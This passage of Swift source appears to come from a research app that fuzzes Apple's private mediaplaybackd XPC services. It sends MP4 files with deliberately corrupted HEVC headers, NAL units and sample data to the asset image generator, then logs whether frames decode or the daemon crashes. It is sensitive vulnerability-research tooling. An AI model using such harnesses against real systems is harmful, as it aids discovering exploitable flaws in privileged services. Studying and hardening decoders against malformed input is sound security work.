                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xdf2: [\(kind)] crBB err=\(e)")
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { xq_release(ac); continue }

            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); emit("xdf2: [\(kind)] gen connect failed"); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0),
               let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xdf2: [\(kind)] crea err=\(e)")
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0),
               let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 600) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xdf2: [\(kind)] req1 err=\(e)")
                    xq_release(r)
                } else {
                    emit("xdf2: [\(kind)] req1 no reply (daemon may have died)")
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 2.5)
            emit("xdf2: [\(kind)] frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.4)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xdf2: done")
    }

    func campaignProbe() {
        emit("xcp: decoder fuzz campaign")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xcp: sample missing"); return
        }

        func findTag(_ d: [UInt8], _ tag: String) -> Int? {
            let t = Array(tag.utf8)
            guard d.count > 8 else { return nil }
            var i = 4
            while i + 4 <= d.count {
                if d[i] == t[0] && d[i+1] == t[1] && d[i+2] == t[2] && d[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func rnd(_ s: inout UInt64) -> UInt64 {
            s = s &* 6364136223846793005 &+ 1442695040888963407
            return s >> 33
        }

        // name, region, byte count, seed, delta
        let plan: [(String, String, Int, UInt64, Int)] = [
            ("hvcC_f1", "hvcC", 1, 1, 0),
            ("hvcC_f2", "hvcC", 2, 2, 0),
            ("hvcC_f4", "hvcC", 4, 3, 0),
            ("hvcC_f8", "hvcC", 8, 4, 0),
            ("hvcC_f16", "hvcC", 16, 5, 0),
            ("mdat_f1", "mdat", 1, 6, 0),
            ("mdat_f4", "mdat", 4, 7, 0),
            ("mdat_f16", "mdat", 16, 8, 0),
            ("mdat_f64", "mdat", 64, 9, 0),
            ("mdat_f256", "mdat", 256, 10, 0),
            ("nal_m1", "nal", 0, 11, -1),
            ("nal_m8", "nal", 0, 12, -8),
            ("nal_p64", "nal", 0, 13, 64),
            ("num_arrays", "field", 0, 14, 0),
            ("level", "field", 0, 15, 1),
            ("sps_zero", "spszero", 0, 16, 0),
            ("pps_zero", "ppszero", 0, 17, 0),
        ]

        func build(_ region: String, _ count: Int, _ seed: UInt64, _ delta: Int) -> Data? {
            var d = [UInt8](original)
            switch region {
            case "hvcC":
                guard let i = findTag(d, "hvcC") else { return nil }
                let lo = i - 4 + 31
                let hi = min(d.count - 1, i - 4 + 240)
                guard hi > lo else { return nil }
                var s = seed
                for _ in 0..<count {
                    let off = lo + Int(rnd(&s) % UInt64(hi - lo))
                    d[off] ^= UInt8(0x40 + (rnd(&s) % 0x80))
                }
            case "mdat":
                guard let i = findTag(d, "mdat") else { return nil }
                let size = (Int(d[i-4]) << 24) | (Int(d[i-3]) << 16) | (Int(d[i-2]) << 8) | Int(d[i-1])
                let lo = i + 4
                let hi = min(d.count - 1, i - 4 + max(size, 4096))
                guard hi > lo + 64 else { return nil }
                var s = seed
                for _ in 0..<count {
                    let off = lo + Int(rnd(&s) % UInt64(hi - lo))
                    d[off] ^= 0xFF
                }
            case "nal":
                guard let i = findTag(d, "hvcC") else { return nil }
                let p = i - 4 + 31
                guard p + 5 < d.count else { return nil }
                let len = (Int(d[p+3]) << 8) | Int(d[p+4])
                let nl = max(1, len + delta)
                guard nl < 60000 else { return nil }
                d[p+3] = UInt8((nl >> 8) & 0xFF)
                d[p+4] = UInt8(nl & 0xFF)
            case "field":
                guard let i = findTag(d, "hvcC") else { return nil }
                let box = i - 4
                if delta == 0 { d[box + 30] = 0xFF } else { d[box + 20] = 0xFF }
            case "spszero":
                guard let i = findTag(d, "hvcC") else { return nil }
                let p = i - 4 + 31
                guard p + 5 < d.count else { return nil }
                let len = (Int(d[p+3]) << 8) | Int(d[p+4])
                let start = p + 5
                guard len > 4, start + len <= d.count else { return nil }
                for k in 0..<len { d[start + k] = 0 }
            case "ppszero":
                guard let i = findTag(d, "hvcC") else { return nil }
                let p = i - 4 + 31
                guard p + 5 < d.count else { return nil }
                let len = (Int(d[p+3]) << 8) | Int(d[p+4])
                let nxt = p + 5 + len
                guard nxt + 5 < d.count else { return nil }
                let l2 = (Int(d[nxt+3]) << 8) | Int(d[nxt+4])
                let s2 = nxt + 5
                guard l2 > 4, s2 + l2 <= d.count else { return nil }
                for k in 0..<l2 { d[s2 + k] = 0 }
            default:
                return nil
            }
            return Data(d)
        }

        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        gotFrame.pointee = false; gotFail.pointee = false

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        for (name, region, count, seed, delta) in plan {
            guard let payload = build(region, count, seed, delta) else { emit("xcp: [\(name)] build failed"); continue }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xcp: [\(name)] asset conn failed"); continue }
            var assetOID: UInt64 = 0
            var eCrbb: Int64 = -999
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    eCrbb = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xcp: [\(name)] crBB=\(eCrbb) no asset"); xq_release(ac); continue }

            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); emit("xcp: [\(name)] gen conn failed"); continue }
            var genOID: UInt64 = 0
            var eCrea: Int64 = -999
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    eCrea = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            var eReq: Int64 = -999
            var reqAnswered = false
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 600) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    eReq = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    reqAnswered = true
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 2.0)
            emit("xcp: [\(name)] crBB=\(eCrbb) crea=\(eCrea) req=\(reqAnswered ? String(eReq) : "none") frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.3)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xcp: done")
    }

    func sampleProbe() {
        emit("xsmp: targeted sample corruption")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xsmp: sample missing"); return
        }

        func findTag(_ d: [UInt8], _ tag: String, from: Int = 4) -> Int? {
            let t = Array(tag.utf8)
            var i = from
            while i + 4 <= d.count {
                if d[i] == t[0] && d[i+1] == t[1] && d[i+2] == t[2] && d[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ d: [UInt8], _ p: Int) -> Int {
            guard p + 4 <= d.count else { return 0 }
            return (Int(d[p]) << 24) | (Int(d[p+1]) << 16) | (Int(d[p+2]) << 8) | Int(d[p+3])
        }

        // First sample: stco[0] gives the chunk offset; stsz gives the size.
        var firstOffset = 0
        var firstSize = 0
        if let i = findTag([UInt8](original), "stco"), i + 12 < original.count {
            firstOffset = be32([UInt8](original), i + 12)
        }
        if let i = findTag([UInt8](original), "stsz"), i + 16 < original.count {
            let uniform = be32([UInt8](original), i + 8)
            if uniform != 0 { firstSize = uniform } else { firstSize = be32([UInt8](original), i + 16) }
        }
        emit("xsmp: first sample offset=\(firstOffset) size=\(firstSize)")
        guard firstOffset > 0, firstSize > 16, firstOffset + firstSize <= original.count else {
            emit("xsmp: cannot locate first sample"); return
        }

        func rnd(_ s: inout UInt64) -> UInt64 {
            s = s &* 6364136223846793005 &+ 1442695040888963407
            return s >> 33
        }
        func build(_ kind: String) -> Data? {
            var d = [UInt8](original)
            switch kind {
            case "baseline":
                break
            case "samp_f1", "samp_f4", "samp_f16", "samp_f64", "samp_f256":
                let n = Int(kind.dropFirst(6)) ?? 1
                var s = UInt64(n) &* 7919 &+ 13
                for _ in 0..<n {
                    let off = firstOffset + Int(rnd(&s) % UInt64(firstSize))
                    d[off] ^= UInt8(0x20 + (rnd(&s) % 0xC0))
                }
            case "samp_head":
                for k in 0..<16 { d[firstOffset + k] ^= 0xFF }
            case "samp_tail":
                for k in 0..<16 { d[firstOffset + firstSize - 16 + k] ^= 0xFF }
            case "samp_zero":
                for k in 0..<firstSize { d[firstOffset + k] = 0 }
            default:
                return nil
            }
            return Data(d)
        }

        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        gotFrame.pointee = false; gotFail.pointee = false

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        for kind in ["baseline", "samp_f1", "samp_f4", "samp_f16", "samp_f64", "samp_f256",
                     "samp_head", "samp_tail", "samp_zero"] {
            guard let payload = build(kind) else { emit("xsmp: [\(kind)] build failed"); continue }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xsmp: [\(kind)] asset conn failed"); continue }
            var assetOID: UInt64 = 0
            var eCrbb: Int64 = -999
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    eCrbb = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xsmp: [\(kind)] crBB=\(eCrbb)"); xq_release(ac); continue }

            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            var reqText = "skipped"
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 600) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    reqText = String(e)
                    xq_release(r)
                } else {
                    reqText = "none"
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 2.0)
            emit("xsmp: [\(kind)] crBB=\(eCrbb) req=\(reqText) frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.3)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xsmp: done")
    }

    func nalMapProbe() {
        emit("xnm: map the first sample into NAL units")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xnm: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ p: Int) -> Int {
            guard p + 4 <= bytes.count else { return 0 }
            return (Int(bytes[p]) << 24) | (Int(bytes[p+1]) << 16) | (Int(bytes[p+2]) << 8) | Int(bytes[p+3])
        }

        guard let stco = findTag("stco"), let stsz = findTag("stsz") else {
            emit("xnm: tables missing"); return
        }
        let offset = be32(stco + 12)
        let uniform = be32(stsz + 8)
        let size = uniform != 0 ? uniform : be32(stsz + 16)
        guard offset > 0, size > 8, offset + size <= bytes.count else {
            emit("xnm: bad sample range"); return
        }

        // lengthSizeMinusOne lives at hvcC box+29.
        var lengthSize = 4
        if let h = findTag("hvcC") {
            lengthSize = Int(bytes[h - 4 + 29] & 3) + 1
        }
        emit("xnm: offset=\(offset) size=\(size) lengthSize=\(lengthSize)")

        // Walk the NAL units of the first sample.
        var pos = 0
        var map: [(Int, Int, Int, Int)] = []   // (relOffset, lengthSize, nalLen, nalType)
        while pos + lengthSize <= size && map.count < 8 {
            var len = 0
            for k in 0..<lengthSize { len = (len << 8) | Int(bytes[offset + pos + k]) }
            if len <= 0 || pos + lengthSize + len > size { break }
            let type = Int((bytes[offset + pos + lengthSize] >> 1) & 0x3F)
            map.append((pos, lengthSize, len, type))
            pos += lengthSize + len
        }
        for (i, m) in map.enumerated() {
            emit("xnm: nal[\(i)] rel=\(m.0) prefix=\(m.1) len=\(m.2) type=\(m.3)")
        }
        // Target the first VCL (coded slice) NAL, not the AUD/SEI.
        guard let vcl = map.first(where: { $0.3 < 32 }) else { emit("xnm: no VCL NAL"); return }
        emit("xnm: vcl rel=\(vcl.0) len=\(vcl.2) type=\(vcl.3)")
        let first = vcl

        func rnd(_ s: inout UInt64) -> UInt64 {
            s = s &* 6364136223846793005 &+ 1442695040888963407
            return s >> 33
        }
        func build(_ kind: String) -> Data? {
            var d = bytes
            let p = offset + first.0
            switch kind {
            case "baseline":
                break
            case "prefix":
                for k in 0..<first.1 { d[p + k] ^= 0xFF }
            case "nal_hdr":
                d[p + first.1] ^= 0xFF
            case "nal_hdr2":
                d[p + first.1 + 1] ^= 0xFF
            case "payload4":
                d[p + first.1 + 4] ^= 0xFF
            case "payload_mid":
                d[p + first.1 + first.2 / 2] ^= 0xFF
            case "payload8_random":
                var s: UInt64 = 99
                for _ in 0..<8 {
                    let off = p + first.1 + 2 + Int(rnd(&s) % UInt64(first.2 - 2))
                    d[off] ^= 0xFF
                }
            case "vcl_zero":
                for k in 0..<(first.1 + first.2) { d[p + k] = 0 }
            default:
                return nil
            }
            return Data(d)
        }

        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        gotFrame.pointee = false; gotFail.pointee = false

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        for kind in ["baseline", "prefix", "nal_hdr", "nal_hdr2", "payload4", "payload_mid", "payload8_random", "vcl_zero"] {
            guard let payload = build(kind) else { emit("xnm: [\(kind)] build failed"); continue }
            gotFrame.pointee = false; gotFail.pointee = false
            guard let (ac, atok) = open("asset") else { emit("xnm: [\(kind)] asset conn failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { emit("xnm: [\(kind)] no asset"); xq_release(ac); continue }
            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); continue }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            var reqText = "skipped"
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 600) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    reqText = String(".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) })
                    xq_release(r)
                } else {
                    reqText = "none"
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 2.0)
            emit("xnm: [\(kind)] req=\(reqText) frame=\(gotFrame.pointee) failed=\(gotFail.pointee)")
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            Thread.sleep(forTimeInterval: 0.3)
        }
        gotFrame.deallocate(); gotFail.deallocate()
        emit("xnm: done")
    }

    func timelineProbe() {
        emit("xtl: decode timeline")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xtl: sample missing"); return
        }
        var bytes = [UInt8](original)
        func findTag(_ tag: String) -> Int? {
            let t = Array(tag.utf8)
            var i = 4
            while i + 4 <= bytes.count {
                if bytes[i] == t[0] && bytes[i+1] == t[1] && bytes[i+2] == t[2] && bytes[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func be32(_ p: Int) -> Int {
            guard p + 4 <= bytes.count else { return 0 }
            return (Int(bytes[p]) << 24) | (Int(bytes[p+1]) << 16) | (Int(bytes[p+2]) << 8) | Int(bytes[p+3])
        }

        if let i = findTag("stts") {
            let n = be32(i + 8)
            emit("xtl: stts entries=\(n)")
            for k in 0..<min(n, 5) {
                let p = i + 12 + k * 8
                emit("xtl: stts[\(k)] count=\(be32(p)) delta=\(be32(p+4))")
            }
        }
        if let i = findTag("stss") {
            let n = be32(i + 8)
            emit("xtl: stss count=\(n)")
            for k in 0..<min(n, 8) { emit("xtl: stss[\(k)] sample=\(be32(i + 12 + k * 4))") }
        }
        if let i = findTag("mdhd") {
            emit("xtl: mdhd timescale=\(be32(i + 16)) duration=\(be32(i + 20))")
        }

        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
            withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let actual = UnsafeMutablePointer<Double>.allocate(capacity: 1)
        gotFrame.pointee = false; gotFail.pointee = false; actual.pointee = -1

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") {
                    gotFrame.pointee = true
                    if let t = "ImageTime".withCString({ xq_dictionary_get_value(e, $0) }),
                       let p = xq_data_bytes(t), xq_data_len(t) >= 12 {
                        var v: Int64 = 0
                        for k in 0..<8 { v |= Int64(p[k]) << (8 * k) }
                        var s: Int32 = 0
                        for k in 0..<4 { s |= Int32(p[8 + k]) << (8 * k) }
                        if s != 0 { actual.pointee = Double(v) / Double(s) }
                    }
                }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
